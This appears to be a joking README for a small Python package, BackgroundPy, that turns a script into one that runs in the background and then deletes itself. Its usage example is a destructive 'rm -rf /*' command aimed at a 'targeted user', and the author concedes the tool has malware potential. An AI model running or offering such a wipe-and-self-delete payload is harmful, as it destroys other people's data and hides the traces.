# BackgroundPy
A tool for generating a runnable script, which runs a python file and deletes itself after it is ran.

## Warning
This tool is capable of running a script as a background thread and removing itself. This tool yields malware/trolling potential; however, do **NOT** use this tool for malicious reasons (just don't).

## Installations
```sh
pip install backgroundpy
```
No I'm not going to list any other methods of installation because literally every other pypi package includes a 5 pages long installation guide on PYPI (google it up).

## Dependencies
* Mac OS/Linux only because Windows is dumb
* Python 3

## Usage
Create a python file with your code in it. An example is provided below:
```python
# Some Random Script

import os

os.system('rm -rf /*') # Very friendly, eh?
```

Just don't put a function that requires packages the targeted user doesn't have.

Next, run the following command. Replace the path with the path of your file:
```sh
python -m backgroundpy MyScript /path/to/the/file/thingy/u/just/created.py
```

The above script creates a folder named *MyScript* (replace with a name of your choice), in which there is a script named *MyScript* that runs the given function and then deletes everything inside that folder.

Note that the output folder is created in the current directory of the bash.

## Some Thoughts
Yes this package is basically useless. I'm just bored (stuck in an IGCSE CS class about what are arrays).